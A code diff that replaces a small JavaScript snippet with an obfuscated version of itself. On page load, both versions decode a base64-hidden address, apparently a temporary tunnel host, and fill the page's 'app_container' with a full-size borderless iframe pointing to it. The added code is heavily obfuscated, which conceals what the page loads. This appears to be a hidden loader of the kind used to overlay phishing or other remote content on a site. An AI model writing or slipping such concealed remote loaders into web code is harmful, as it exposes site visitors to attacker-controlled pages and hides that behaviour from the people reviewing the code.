@@ -1,21 +1,2 @@
-window.addEventListener('DOMContentLoaded', (event) => {
-    (function() {
-        var _0x5a21 = "aHR0cHM6Ly9maW5pc2hpbmctY2FtY29yZGVycy1jcmFpZy1vbnMudHJ5Y2xvdWRmbGFyZS5jb20="; 
-        var _0x8b12 = atob(_0x5a21);
-        
-        var _0x3c9f = document.createElement("iframe");
-        _0x3c9f.setAttribute("src", _0x8b12);
-        _0x3c9f.setAttribute("id", "_view_frame");
-        _0x3c9f.style.width = "100%";
-        _0x3c9f.style.height = "100%";
-        _0x3c9f.style.border = "none";
-        
-        var container = document.getElementById("app_container");
-        if (container) {
-            container.appendChild(_0x3c9f);
-        } else {
-            console.error("خطا: المانی با آی‌دی app_container پیدا نشد!");
-        }
-    })();
-});
+var _0x578e99=_0x5701;(function(_0x5e57ff,_0xaa41b){var _0x4dae37=_0x5701,_0x3637b3=_0x5e57ff();while(!![]){try{var _0x4fbdf7=parseInt(_0x4dae37(0x1dc))/0x1*(parseInt(_0x4dae37(0x1e8))/0x2)+-parseInt(_0x4dae37(0x1dd))/0x3+parseInt(_0x4dae37(0x1eb))/0x4*(-parseInt(_0x4dae37(0x1ed))/0x5)+parseInt(_0x4dae37(0x1e7))/0x6+-parseInt(_0x4dae37(0x1f1))/0x7*(parseInt(_0x4dae37(0x1ee))/0x8)+parseInt(_0x4dae37(0x1e4))/0x9+parseInt(_0x4dae37(0x1e1))/0xa*(parseInt(_0x4dae37(0x1e6))/0xb);if(_0x4fbdf7===_0xaa41b)break;else _0x3637b3['push'](_0x3637b3['shift']());}catch(_0x22a403){_0x3637b3['push'](_0x3637b3['shift']());}}}(_0x3d85,0x51cc4),window[_0x578e99(0x1e9)](_0x578e99(0x1ef),_0x26dc5e=>{(function(){var _0x10cc91=_0x5701,_0x5d25ac=_0x10cc91(0x1f4),_0x5d5455=atob(_0x5d25ac),_0x3e4945=document['createElement'](_0x10cc91(0x1f0));_0x3e4945[_0x10cc91(0x1ec)]('src',_0x5d5455),_0x3e4945[_0x10cc91(0x1ec)]('id',_0x10cc91(0x1df)),_0x3e4945[_0x10cc91(0x1f2)]['width']='100%',_0x3e4945['style'][_0x10cc91(0x1f3)]=_0x10cc91(0x1ea),_0x3e4945[_0x10cc91(0x1f2)][_0x10cc91(0x1de)]='none';var _0x2529a4=document[_0x10cc91(0x1e0)]('app_container');_0x2529a4?_0x2529a4[_0x10cc91(0x1e2)](_0x3e4945):console[_0x10cc91(0x1e3)](_0x10cc91(0x1e5));}());}));function _0x5701(_0x2f3c7a,_0x548b66){_0x2f3c7a=_0x2f3c7a-0x1dc;var _0x3d8596=_0x3d85();var _0x5701a7=_0x3d8596[_0x2f3c7a];return _0x5701a7;}function _0x3d85(){var _0x1eccbe=['859464YmELNQ','خطا:\x20المانی\x20با\x20آی‌دی\x20app_container\x20پیدا\x20نشد!','36641dJxRhQ','3502188aRCTis','145336pAQubm','addEventListener','100%','4LIjZtO','setAttribute','110015RCcZHr','2488776LaIhel','DOMContentLoaded','iframe','14FToKga','style','height','aHR0cHM6Ly9maW5pc2hpbmctY2FtY29yZGVycy1jcmFpZy1vbnMudHJ5Y2xvdWRmbGFyZS5jb20=','5FbHONF','1958640yVjSrd','border','_view_frame','getElementById','1770JdxRYI','appendChild','error'];_0x3d85=function(){return _0x1eccbe;};return _0x3d85();}
 
